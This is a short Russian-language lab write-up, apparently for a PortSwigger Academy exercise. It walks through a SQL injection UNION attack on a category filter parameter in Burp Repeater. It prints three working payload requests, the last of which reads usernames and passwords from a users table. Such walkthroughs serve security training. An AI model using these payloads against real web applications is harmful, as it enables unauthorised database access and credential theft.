Зайдем на любую из страниц, и найдем данный запрос в `Proxy` -> `HTTP history` и отправим данный запрос в `Repeater`

На следующем шагу определим колиячество столбцов в таблице
```
GET /filter?category=Lifestyle'+UNION+SELECT+NULL,NULL--
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/5.%20SQL%20injection%20UNION%20attack%2C%20retrieving%20data%20from%20other%20tables/pics%20for%20walktrough/1.png)

Определим что оба данных столбца имею тектовый формат отображения
```
GET /filter?category=Lifestyle'+UNION+SELECT+'a','a'--
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/5.%20SQL%20injection%20UNION%20attack%2C%20retrieving%20data%20from%20other%20tables/pics%20for%20walktrough/2.png)

Так как нам известно по заданию, что существует таблица `users`, в которой есть столбцы `username`, `password`, самое время посмотреть что там внутри
Обратимся к таблице users и уберем из запроса `Lifestyle` (чтобы нужные столбцы не смешивались с данными с таблицы `Lifestyle`)
```
GET /filter?category='+UNION+SELECT+username,password+FROM+users--
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/5.%20SQL%20injection%20UNION%20attack%2C%20retrieving%20data%20from%20other%20tables/pics%20for%20walktrough/3.png)

Тем самым, мы узнали логины и пароли из таблицы `users`
